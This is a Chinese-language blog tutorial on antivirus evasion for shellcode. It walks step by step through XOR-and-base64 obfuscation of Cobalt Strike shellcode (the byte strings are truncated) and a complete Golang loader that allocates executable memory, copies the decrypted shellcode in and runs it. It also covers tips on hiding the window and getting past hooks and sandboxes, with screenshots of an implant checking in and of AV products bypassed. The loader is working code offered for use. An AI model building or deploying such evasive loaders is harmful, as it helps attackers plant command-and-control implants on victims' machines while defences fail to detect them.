# 前言

云山雾隐安全实验室的小伙伴最近在研究免杀，与免杀相关的技术大致都有涉略和学习。也在学习过程中实践过几个项目，但这期间基本都是在“吸收”，并没有太多的"输出"。于是打算着手出一篇能让
**新手快速入门** 的文章，下面就跟着云山雾隐安全实验室打开shellcode免杀的大门。

非专业二进制选手，初涉免杀，若内容有冒犯或错误之处还请在评论中指出。

# 何为shellcode

进入正题前不妨先问问大家，何为shellcode？

shellcode是一段用于利用软件漏洞而执行的代码，shellcode为16进制的机器码，因常让攻击者获得shell而得名。shellcode常常使用机器语言编写，可在暂存器eip溢出后，塞入一段可让CPU执行的shellcode机器码，让电脑可以执行攻击者的任意指令。

对于新手来说，上面这段解释确实很难让人真正理解它所说的东西。通俗讲，其实shellcode和其他代码没什么太大的区别，就是一段正常的code，因其常被用来"干坏事"(getshell)所以大家都叫它shellcode。通常也指对这一类代码的称呼，比如我们复现漏洞常用的弹计算器的代码也被称作shellcode。

常见的shellcode都是一串16进制的机器码，本质上是一段汇编指令，如下图所示：

![](https://image.3001.net/images/20220304/1646358774_622170f66d2e2263071a7.png!small)

当shellcode被写入内存后，会被翻译成CPU指令。而CPU在执行这些指令的时候是由上而下去执行的，这其中有一个特殊的寄存器——eip寄存器，它里面存放的值是CPU下次要执行的指令地址，此时只需要改一下eip寄存器的值，即可执行shellcode。

## 杀软如何进行查杀

目前的杀软查杀手段总结起来主要有两种：

>  **1\. 基于特征；**
>
>  **2\. 基于行为。**

除此之外还有云查杀和沙箱，云查杀本质上也是基于特征查杀；而沙箱则需要做反沙箱，非本文重点即不再赘述。

### 基于特征查杀

对特征来讲，大多数杀软都会定义一个阈值，当文件内部的特征数量达到一定程度时就会直接判断为恶意程序。一般是判断文件的md5、sha1hash、匹配文件中存在的字符串、程序入口点、IAT导入表等手段进行查杀，此类查杀非常依赖厂商病毒库的更新。

### 基于行为查杀

杀软一般是对系统多个API进行了hook，如：注册表操作、添加启动项、添加服务、添加用户、注入、创建进程、创建线程、加载DLL等等。杀软除了进行hook关键API，还会对API调用链进行监控，如：申请内存，将shellcode加载进内存，再执行内存区域shellcode。

## 免杀准备工作

  * 掌握一门编程语言，本文将采用Golang进行演示；

  * 基本掌握cs或msf的使用；

  * 想深入实践还需具备一定win32知识、汇编知识、pe文件知识等。

## 静态免杀

对抗基于特征的静态免杀比较简单，可以使用加壳改壳、添加/替换资源文件、修改特征码、加密Shellcode等方法，轻而易举达到免杀效果。

云山雾隐安全实验室常用的手段是加密shellcode，可用的加密方法有很多，如：直接使用aes、des、xor、base64、hex等方法进行加密或自写加密，仅需把shellcode特征去除即可。我们比较偏向用xor，主要是加密效果不错，无需引入额外的包；用Go写的loader体积本就比较大，若再引入几个其他包则会更大。

## 行为免杀

对抗此类针对行为的查杀，我们通常会进行API替换、使用未被hook的API、直接系统调用、替换操作方式采用白加黑手段等等。

## 实战免杀

看完理论知识，下面进行实战演练。

小知识点：用Golang编写的程序，哪怕是helloWorld也有一些杀软会报毒。我们放在VT就可以看出来，所以这几个没什么参考价值。

### helloWorld

    
    
    package main  
    ​  
    import "fmt"  
    ​  
    func main() {  
    ​  
    fmt.Print("hello world")  
    }

![](https://image.3001.net/images/20220304/1646359029_622171f51edb28db776eb.png!small)

从以上测试来看，只写或打印1个helloworld也有五个报毒，我们用cs生成shellcode加进去看看。

由于cs没有直接生成Go可用的，此处生成Java的改一下。Java yyds!

![](https://image.3001.net/images/20220304/1646359045_62217205a8a001d3d6b87.png!small)

最终代码如下：

    
    
    package main  
    ​  
    import "fmt"  
    ​  
    func main() {  
    fmt.Println("hello world")  
    var shellcode = []byte{  
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d.......}  
    fmt.Println(shellcode)  
    }

VT结果如下，排除之前的5个后多了14个：

![](https://image.3001.net/images/20220304/1646359068_6221721c78858ec4cbd0f.png!small)

### xor加密shellcode

我们开始写个小工具用xor加密shellcode：

    
    
    package main  
    ​  
    import (  
    "fmt"  
    "encoding/base64"  
    )  
    ​  
    var key = []byte{0x1b, 0x51,0x11}  
    ​  
    func main() {  
    ​  
    var shellcode = []byte{  
    0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc8, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52, 0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72, 0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0, 0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b, 0x42, 0x3c, 0x48, 0x01, 0xd0, 0x66, 0x81, 0x78......}  
      
    code := E(shellcode)  
    fmt.Println(code)  
    }  
    ​  
    func E(shellcode []byte) string {  
    var xorShellcode []byte  
    for i := 0; i < len(shellcode); i++ {  
    xorShellcode = append(xorShellcode, shellcode[i]^key[2]^key[1])  
    }  
    return base64.StdEncoding.EncodeToString(xorShellcode)  
    }

把加密后的shellcode再放进去试试，对应的解密函数也要在里面：

    
    
    package main  
    ​  
    import (  
    "fmt"  
    "encoding/base64"  
    )  
    ​  
    ​  
    var key = []byte{0x1b, 0x51,0x11}  
    ​  
    func main() {  
    ​  
    var shellcode = "vAjDpLCoiEBAQAERARASERYIcZIlCMsSIAjLElgIyxJgCMsyEAhP9woKDXGJCHGA7HwhPEJsYAGBiU0BQYGirRIBEQjLEmDLAnwIQZAmwThYS0I1MsvAyEBAQAjFgDQnCEGQEMsIWATLAGAJQZCjFgi/iQHLdMgIQZYNcYkIcYDsAYGJTQFBgXigNbEMQwxkSAV5kTWYGATLAGQJQZAmActMCATLAFwJQZABy0TICEGQARgBGB4ZGgEYARkBGgjDrGABEr+gGAEZGgjLUqkPv7+/HSpACf43KS4pLiU0QAEWCcmmDMmxAfoMN2ZHv5U......."  
    ​  
    code := string(DD(shellcode))  
    fmt.Println(code)  
    }  
    ​  
    ​  
    func DD(src string) []byte {  
    ss, _ := base64.StdEncoding.DecodeString(src)  
    string2 := string(ss)  
    xor_shellcode := []byte(string2)  
    var shellcode []byte  
    for i := 0; i < len(xor_shellcode); i++ {  
    shellcode = append(shellcode, xor_shellcode[i]^kk[1]^kk[2])  
    }  
    return shellcode  
    }

可见，效果好了很多。

接下来直接写个loader加载这个shellcode即可：

![](https://image.3001.net/images/20220304/1646359109_62217245de13c51933a39.png!small)

### shellcode loader

shellcode要想执行需要经历如下几个过程：

> 1\. 申请一块内存；
>
> 2\. 把shellcode加载到这块内存；
>
> 3\. 执行这块内存。

这过程中需要注意如下几点：

> 1\. 加载dll，采用动态调用的方式，可以避免IAT的hook；
>
> 2\. 不要直接申请rwx(读写执行)的内存，可先申请rw内存，后面再改为可执行，杀软对rwx的内存很敏感；
>
> 3\. 加载到内存的方法非常多，除了常见的copy和move还有uuid这种加载既能达到加密shellcode的效果，还能直接加载到内存；
>
> 4\. 执行内存，还可以用回调来触发如EnumChildWindows；
>
> 5\. API调用中间可以插入一些没用的代码，打乱API调用；
>
> 6\. 适当加一些sleep，可以过一些沙箱。

###  **下面开始用代码验证以上说法：**

 **第一步，先定义需要用到的函数和变量：**

    
    
    const (  
    MEM_COMMIT             = 0x1000  
    MEM_RESERVE            = 0x2000  
    PAGE_EXECUTE_READWRITE = 0x40  
    )  
    ​  
    var kk = []byte{0x1b, 0x51,0x11}  
    ​  
    var (  
    kernel32      = syscall.MustLoadDLL("kernel32.dll")  
    ntdll         = syscall.MustLoadDLL("ntdll.dll")  
    VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")  
    RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")  
    )

 **第二步，添加shellcode解密函数：**

    
    
    func DD(src string) []byte {  
    ss, _ := base64.StdEncoding.DecodeString(src)  
    var shellcode []byte  
    for i := 0; i < len(ss); i++ {  
    shellcode = append(shellcode, ss[i]^kk[1]^kk[2])  
    }  
    return shellcode  
    }

 **第三步，开始申请内存。**

经测试发现用Golang写的loader，直接申请rwx内存或申请rw内存再用VirtualProtect加x，效果没什么明显区别。所以此处直接申请rwx内存：

    
    
    addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)  
    if err != nil && err.Error() != "The operation completed successfully." {  
    syscall.Exit(0)  
    }

 **第四步，把shellcode拷贝到申请的内存块：**

    
    
    _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))  
    if err != nil && err.Error() != "The operation completed successfully." {  
    syscall.Exit(0)  
    }

 **第五步，系统调用，执行这块内存：**

    
    
    syscall.Syscall(addr, 0, 0, 0, 0)

 **最后整合代码，试试效果：**

    
    
    package main  
      
    import (  
    "encoding/base64"  
    "syscall"  
    "unsafe"  
    )  
      
      
    const (  
    MEM_COMMIT             = 0x1000  
    MEM_RESERVE            = 0x2000  
    PAGE_EXECUTE_READWRITE = 0x40  
    )  
      
    var kk = []byte{0x1b, 0x51,0x11}  
      
    var (  
    kernel32      = syscall.MustLoadDLL("kernel32.dll")  
    ntdll         = syscall.MustLoadDLL("ntdll.dll")  
    VirtualAlloc  = kernel32.MustFindProc("VirtualAlloc")  
    RtlCopyMemory = ntdll.MustFindProc("RtlCopyMemory")  
    )  
      
    func main() {  
      
    var shellcode = "vAjDpLCoiEBAQAERARASERYIcZIlCMsSIAjLElgIyxJgCMsyEAhP9woKDXGJCHGA7HwhPEJsYAGBiU0BQYGirRIBEQjLEmDLAnwIQZAmwThYS0I1MsvAyEBAQAjFgDQnCEGQEMsIWATLAGAJQZCjFgi/iQHLdMgIQZYNcYkIcYDsAYGJTQFBgXigNbEMQwxkSAV5kTWYGATLAGQJQZAmActMCATLAFwJQZABy0TICEGQARgBGB4ZGgEYARkBGgjD..........."  
      
    charcode := DD(shellcode)  
      
      
      
    addr, _, err := VirtualAlloc.Call(0, uintptr(len(charcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)  
    if err != nil && err.Error() != "The operation completed successfully." {  
    syscall.Exit(0)  
    }  
      
    _, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&charcode[0])), uintptr(len(charcode)))  
    if err != nil && err.Error() != "The operation completed successfully." {  
    syscall.Exit(0)  
    }  
      
    syscall.Syscall(addr, 0, 0, 0, 0)  
      
      
    }  
      
    func DD(src string) []byte {  
    ss, _ := base64.StdEncoding.DecodeString(src)  
    var shellcode []byte  
    for i := 0; i < len(ss); i++ {  
    shellcode = append(shellcode, ss[i]^kk[1]^kk[2])  
    }  
    return shellcode  
    }

 **编译执行：**

    
    
    export GOOS="windows"; go build ./1.go 

如上编译出来的，是带窗口的，可以用`-H=windowsgui`隐藏

其它编译命令：

    
    
    减少文件体积  
    go build -ldflags="-s -w" -o main1.exe  
    减少文件体积+隐藏窗口  
    go build -ldflags="-s -w -H=windowsgui" -o main2.exe

可见正常上线：

![](https://image.3001.net/images/20220304/1646359184_62217290bc326846df2de.png!small)

接下来看免杀效果如何，应对国内这两兄弟是足够了，不过360开启核晶还是很猛的：

![](https://image.3001.net/images/20220304/1646359197_6221729dc6b944aa6ac2e.png!small)![](https://image.3001.net/images/20220304/1646359210_622172aa2ad3b87132ab2.png!small)

再看下vt的结果：在没做反沙箱的情况下，这效果也还不错：

![](https://image.3001.net/images/20220304/1646359230_622172be034bd301747ba.png!small)

以上，也算简单的入门免杀了。

## References

  * <https://github.com/Airboi/bypass-av-note>

  * <https://github.com/safe6Sec/GolangBypassAV>

  * [https://github.com/Rvn0xsy/BadCode﻿](https://github.com/Rvn0xsy/BadCode)

